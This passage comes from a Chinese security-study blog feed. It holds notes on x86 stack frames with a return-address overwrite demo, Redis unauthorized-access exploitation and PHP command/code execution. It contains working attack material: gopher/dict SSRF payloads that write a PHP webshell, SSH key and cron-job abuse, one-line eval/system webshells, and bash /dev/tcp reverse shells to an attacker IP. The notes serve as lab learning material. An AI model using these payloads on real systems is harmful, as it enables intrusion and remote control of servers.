EAX,CCCCCCCC</h3><ul><li>赋值ECX为CCCCCCCC</li></ul><h3 id="REP-STOS-DWORD-PTR-ES-EDI"><a href="#REP-STOS-DWORD-PTR-ES-EDI" class="headerlink" title="REP STOS DWORD PTR ES:[EDI]"></a>REP STOS DWORD PTR ES:[EDI]</h3><ul><li>循环执行将EAX中的值填充到EDI的地址所指向的位置，每次循环EDI自增加4(默认D为0是自增)，从而达到向下填充的目的</li></ul><p><img src="https://i.imgur.com/jso4GHh.gif"></p><p>似乎漏了一个，不过问题不大，这里将缓冲区填充入了CCCCCCCC</p><p><img src="https://i.imgur.com/qfUTauE.png"></p><h2 id="MOV-DWORD-PTR-SS-EBP-4-2"><a href="#MOV-DWORD-PTR-SS-EBP-4-2" class="headerlink" title="MOV DWORD PTR SS:[EBP-4],2"></a>MOV DWORD PTR SS:[EBP-4],2</h2><p><img src="https://i.imgur.com/rYIn2Ml.gif"></p><p>右下角堆栈变化<br><img src="https://i.imgur.com/kGcPD2o.png"></p><p>最后压入了局部变量2</p><p><img src="https://i.imgur.com/1IqXJD9.png"></p><h2 id="指令集-3"><a href="#指令集-3" class="headerlink" title="指令集-3"></a>指令集-3</h2><h3 id="MOV-EAX-DWORD-PTR-SS-EBP-8"><a href="#MOV-EAX-DWORD-PTR-SS-EBP-8" class="headerlink" title="MOV EAX,DWORD PTR SS:[EBP+8]"></a>MOV EAX,DWORD PTR SS:[EBP+8]</h3><p>朝着EAX中存入参数值3，EAX&#x3D;3</p><h3 id="ADD-EAX-DWORD-PTR-SS-EBP-C"><a href="#ADD-EAX-DWORD-PTR-SS-EBP-C" class="headerlink" title="ADD EAX,DWORD PTR SS:[EBP+C]"></a>ADD EAX,DWORD PTR SS:[EBP+C]</h3><p>EAX加上参数4，EAX&#x3D;4+3&#x3D;7</p><h3 id="ADD-EAX-DWORD-PTR-SS-EBP-4"><a href="#ADD-EAX-DWORD-PTR-SS-EBP-4" class="headerlink" title="ADD EAX,DWORD PTR SS:[EBP-4]"></a>ADD EAX,DWORD PTR SS:[EBP-4]</h3><p>EAX加上局部变量2，EAX&#x3D;7+2&#x3D;9</p><p>示范：<br><img src="https://i.imgur.com/0IHP4X9.gif"></p><p>堆栈图：<br><img src="https://i.imgur.com/vR4SELI.png"></p><p>如果找返回值重点关注EAX，如果找参数重点关注EBP+8后面的东西，局部变量重点找EBP-4后面的东西</p><blockquote><p>[!warning] 注意<br>[EBP+4]是当前程序的返回地址，不能随意修改。</p></blockquote><h2 id="指令集-4"><a href="#指令集-4" class="headerlink" title="指令集-4"></a>指令集-4</h2><h3 id="POP-EDI"><a href="#POP-EDI" class="headerlink" title="POP EDI"></a>POP EDI</h3><p>取出堆栈中的EDI</p><h3 id="POP-ESI"><a href="#POP-ESI" class="headerlink" title="POP ESI"></a>POP ESI</h3><p>取出堆栈中的ESI</p><h3 id="POP-EBX"><a href="#POP-EBX" class="headerlink" title="POP EBX"></a>POP EBX</h3><p>取出堆栈中的EBX</p><p>运行示范：<br><img src="https://i.imgur.com/md9qjjp.gif"></p><p>堆栈图变化：<br><img src="https://i.imgur.com/Ecaw9hI.png"></p><h2 id="指令集-5"><a href="#指令集-5" class="headerlink" title="指令集-5"></a>指令集-5</h2><h3 id="MOV-ESP-EBP"><a href="#MOV-ESP-EBP" class="headerlink" title="MOV ESP,EBP"></a>MOV ESP,EBP</h3><p>将EBP的值赋给ESP,此刻ESP&#x3D;EBP</p><h3 id="POP-EBP"><a href="#POP-EBP" class="headerlink" title="POP EBP"></a>POP EBP</h3><p>取栈顶的元素赋值给EBP,此时栈顶的元素为0012FF80</p><p><img src="https://i.imgur.com/jg05JTA.png"></p><h2 id="RUTN"><a href="#RUTN" class="headerlink" title="RUTN"></a>RUTN</h2><p>将堆栈中的返回地址弹出到EIP中，</p><p><img src="https://i.imgur.com/wghvHHW.gif"></p><p>堆栈图：<br><img src="https://i.imgur.com/QYQ7RZp.png"></p><h2 id="ADD-ESP-8"><a href="#ADD-ESP-8" class="headerlink" title="ADD ESP,8"></a>ADD ESP,8</h2><p>达成堆栈平衡，这里属于外堆栈平衡，执行到此处</p><p><img src="https://i.imgur.com/iAKK4yk.png"></p><h2 id="修改-EXP-4-的示例"><a href="#修改-EXP-4-的示例" class="headerlink" title="修改[EXP+4]的示例"></a>修改<code>[EXP+4]</code>的示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># inculde &quot;stdafx.h&quot;</span><br><span class="line"></span><br><span class="line">viod Attack()</span><br><span class="line">&#123;</span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;攻击程序\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">int arr[5]=&#123;0&#125;;</span><br><span class="line">arr[6]=(int)Attack;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为一段死循环<br><img src="https://i.imgur.com/pFl7nif.gif"></p><p>关键点</p><p><img src="https://i.imgur.com/nmcoDBA.png"><br>因为int占用4个字节, arr[6]相当于数组越界了四个字节，所以arr[6]地址对应到了[ebp+4]<br>这里将函数赋值给了返回值[ebp+4]，导致反复调用函数进入死循环</p><h4 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inculde <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HelloWorld</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">HelloWorld();</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果<br><img src="https://i.imgur.com/ZfzXTxg.gif"></p><p>局部变量i和局部变量a[]数组在堆栈里紧挨着，数组十个下标最大9，因此a[10]越界将i写成了0</p><p>a[10]&#x3D;0,对应的应该是i的值,所以每次一到a[10],i就会被重置成0</p>]]></content>
      
      
      <categories>
          
          <category> 逆向学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆栈图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权基础学习</title>
      <link href="/2024/10/06/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
      <url>/2024/10/06/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>Redis未授权的简单学习，基本没什么内容啊，等之后从暑假库抓一些内容过来吧</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p>参照阅读：<a href="https://www.cnblogs.com/smileleooo/p/18089027#%E5%88%A9%E7%94%A8redis%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">Redis未授权漏洞复现 - smileleooo - 博客园 (cnblogs.com)</a></p><p>搜索野站</p><p><img src="https://i.imgur.com/IhIqefK.png"></p><h2 id="redis未授权直链"><a href="#redis未授权直链" class="headerlink" title="redis未授权直链"></a>redis未授权直链</h2><p><img src="https://i.imgur.com/IuG4cmL.gif"></p><p>基本验证，使用info命令</p><p><img src="https://i.imgur.com/ITUBWiP.gif"></p><p>获取shell,这里取之前的实验内容，一般redis获取shell的方法</p><p>第一个：手写redis的webshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dict://localhost:6378/flushall</span><br><span class="line">dict://localhost:6378/config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/var/www/html/app1</span><br><span class="line">dict://localhost:6378/config:<span class="built_in">set</span>:dbfilename:hh.php</span><br><span class="line">dict://localhost:6378/set:1:<span class="string">&quot;\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x77\x5d\x29\x3b\x3f\x3e&quot;</span></span><br><span class="line">dict://localhost:6378/save</span><br><span class="line"></span><br><span class="line">webshell密码w</span><br></pre></td></tr></table></figure><p>第二个：gopaer协议url  </p><p><img src="https://i.imgur.com/sfuyj5K.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:6378/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2418%0D%0A/var/www/html/app1%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Kl78flr.png"></p><p>方法二：公私钥（没有公私钥的使用ssh-keygen -t rsa生成）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 6378(目标端口)</span><br><span class="line">ping </span><br><span class="line">flushall</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config  set dbfilename authorized_keys(系统指定名称)</span><br><span class="line">set x &quot;\n\n\n本机的ssh公钥\n\n\n&quot;</span><br><span class="line">save</span><br><span class="line">ssh root@靶机ip    利用公私钥直接连接目标靶机</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SKGjf8N.png"></p><p><img src="https://i.imgur.com/LqM2H9N.png"></p><p>方法三：计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 6378(目标端口)</span><br><span class="line">ping </span><br><span class="line">flushall</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set ziye2(计划任务的名称) &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/攻击机ip/4545(监听端口) 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">另起一个命令行窗口监听端口</span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p>方法四：主从备份</p><ol><li>http:&#x2F;&#x2F;虚拟机ip&#x2F;app1&#x2F;robots.txt<br> <img src="https://i.imgur.com/30P7gwF.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 未授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行/代码执行学习基础</title>
      <link href="/2024/10/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/10/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于命令执行与代码执行相关的基础学习</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>命令执行<br>开发者没有严格校验并过滤用户输入的内容，使用户输入的数据拼接到命令执行函数中，并执行</p><p>代码执行：<br>开发者没有严格校验并过滤用户输入的内容，使用户输入的数据拼接到代码执行函数中，并执行</p><hr><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p>参考：<a href="https://y4er.com/posts/code-exec/#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">代码执行&#x2F;命令执行总结 - Y4er的博客</a></p><p>一行正常的php代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;echo &#x27;hello world!&#x27;;&quot;</span>;       </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);       <span class="comment">//php代码执行函数，将a中的php代码提取并执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);     <span class="comment">//cmd代码执行函数，将a中的字段直接拼接到cmd中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用代码执行函数执行了变量a中的代码段，以此，当php代码段中存在用户输入时，便是代码执行的漏洞，注意，这两个是不同的环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;print(&#x27;a&#x27;)&#x27;;&quot;</span>; </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);       <span class="comment">//php代码执行函数，将a中的php代码提取并执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$b</span>);     <span class="comment">//cmd代码执行函数，将a中的字段直接拼接到cmd中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里<code>system($b)</code>执行<code>whoami</code>的cmd命令，<code>eval($a)</code>执行的php代码<code>print(&#39;a&#39;)&#39;;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;print(&#x27;a&#x27;)&#x27;;&quot;</span>; </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$b</span>));      <span class="comment">//括号内优先执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这属于是文件上传常见的木马，<code>?cmd=phpinfo();</code>执行php代码，当传入的值为<code>?cmd=system(&quot;whoami&quot;)</code>，这就是文件上传常用的命令</p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单利用，写一个1.php文件</p><p><img src="https://i.imgur.com/fQBP5PS.gif"></p><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单利用，写一个1.php文件</p><p><img src="https://i.imgur.com/fQBP5PS.gif"></p><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace — 执行一个正则表达式的搜索和替换 搜索subject中匹配pattern的部分， 以replacement进行替换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/所替换字节.*/e&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>],<span class="string">&#x27;任意字节&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>会搜索任意字节中的所替换字节进行替换，替换成命令执行部分的函数</p><p>下面示例1.txt中任意字节部分为jutst test字符串，替换字节为test，匹配将test替换成了代码执行函数</p><p><img src="https://i.imgur.com/hSZf6oC.gif"></p><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>create_function函数接收两个参数<code>$args</code> 和 <code>$code</code> 然后组成新函数<code>function_lambda_func($args)&#123;$code;&#125;</code> 并<code>eval(function_lambda_func($args)&#123;$code;&#125;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们不需要传参数，直接把<code>$code</code>改为普通的一句话就行了。</p><p><img src="https://i.imgur.com/5xPJuUC.gif"></p><h4 id="arry-map"><a href="#arry-map" class="headerlink" title="arry_map()"></a>arry_map()</h4><hr><h1 id="命令执行常用函数"><a href="#命令执行常用函数" class="headerlink" title="命令执行常用函数"></a>命令执行常用函数</h1><p>记录一些常用的命令执行函数</p><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h2><p>简单使用</p><p><img src="https://i.imgur.com/PQo89We.gif"></p><p>写马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span> `a`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ZnzNLAA.gif"></p><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>执行外部程序，并且显示输出，本函数执行 command 参数所指定的命令， 并且输出执行结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行示例</p><p><img src="https://i.imgur.com/Cei019z.gif" alt="Cei019z.gif"></p><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>执行 command 参数所指定的命令,且只返回最数据的最后一行。注意，这并不会直接显示结果，需要打印函数(print,echo之类的)。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行示例</p><p><img src="https://i.imgur.com/Jd7pYS5.gif"></p><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h2><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用示例</p><p><img src="https://i.imgur.com/TRq5uwt.gif"></p><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行外部程序并且显示原始输出</p><p><img src="https://i.imgur.com/WwtQ9CM.gif" alt="WwtQ9CM.gif"></p><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h2><h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h2><p>执行一个命令并且用来打开输入&#x2F;输出的文件指针</p><h1 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h1><p>1.有回显的命令注入判断：通过读取系统存在的文件或者执行系统命令:whoami,id等</p><p>2.无回显命令注入判断：</p><ul><li>写入或者删除文件</li><li>dnslog判断,如果被拦截就是用其他网页或者自己进行服务器搭建</li></ul><hr><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>由于防火墙只限制入，不限制出网，所以将链接状态变为服务器向外部发起连接</p><p>操作步骤：</p><p>本地监听端口：<code>nc -lvvp 7777</code></p><p>受害者执行<code>/bin/sh -i &gt;&amp; /dev/tcp/49.232.55.19/7777 0&gt;&amp;1</code></p><h2 id="反弹shell演示"><a href="#反弹shell演示" class="headerlink" title="反弹shell演示"></a>反弹shell演示</h2><p>这里主要使用了另外的网页工具进行辅助，但实际上用处不大</p><p>攻击机:192.168.187.132<br>攻击机监听端口</p><p><img src="https://i.imgur.com/pHVO764.gif"></p><p>靶机执行反弹shell的命令</p><p><img src="https://i.imgur.com/Hj1BUUR.gif"></p><p>使用默认sh反弹到shell</p><p><img src="https://i.imgur.com/8KUjqZF.gif"></p><p>尝试使用python反弹shell</p><p><img src="https://i.imgur.com/jLmwThT.gif"></p><p>反弹shell可采用多种方式</p><hr><h1 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h1><p>记录一下windows常用命令</p><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>记录一些Linux常用命令</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>首先写一个测试文件2.txt</p><p><img src="https://i.imgur.com/PS4bDmZ.gif"></p><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>第一行开始显示内容，并将所有内容输出.</p><p><img src="https://i.imgur.com/Ft8WYcP.png"></p><h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>从最后一行倒序显示内容，并将所有内容输出.</p><p><img src="https://i.imgur.com/k2dmKxB.png"></p><h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p>只显示头几行。</p><p>可加<code>-c</code> 设置一次显示的字符数。<code>-n</code>设置从显示行数。</p><p><img src="https://i.imgur.com/ewmDEZ9.png"></p><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>使用文件协议读文件</p><p><img src="https://i.imgur.com/8zTh35m.png"></p><h3 id="目录读取"><a href="#目录读取" class="headerlink" title="目录读取"></a>目录读取</h3><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>用于查看参数目录下的文件。基本用法：ls 文件路径</p><p><img src="https://i.imgur.com/DgV2dTf.png"></p><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>与ls类似，用于查看参数目录下的文件。基本 用法：dir 文件路径</p><p><img src="https://i.imgur.com/lv1dKgg.png"><br>默认查看</p><h3 id="Linux链接符"><a href="#Linux链接符" class="headerlink" title="Linux链接符"></a>Linux链接符</h3><h4 id="“-”分号用法"><a href="#“-”分号用法" class="headerlink" title="“;”分号用法"></a><strong>“<code>;</code>”分号用法</strong></h4><p>方式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure><p>作用：隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。</p><p><img src="https://i.imgur.com/BhJDExU.gif"></p><p><img src="https://i.imgur.com/L7MfAir.png"></p><h4 id="“-”管道符用法"><a href="#“-”管道符用法" class="headerlink" title="“| ”管道符用法"></a><strong>“<code>|</code> ”管道符用法</strong></h4><p>方式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure><p>作用：链接命令执行，上一条命令的输出，作为下一条命令参数。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推.</p><hr><h1 id="提及话题"><a href="#提及话题" class="headerlink" title="提及话题"></a>提及话题</h1><ol><li><p>使用<code>chr()</code>内置函数绕过<br><img src="https://i.imgur.com/vkEC7x3.gif"></p></li><li><p>反弹shell命令网站：<a href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a></p></li><li><p>一句话木马详解<br>示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p><strong><code>&lt;?php ... ?&gt;</code></strong></p><ul><li>表示 PHP 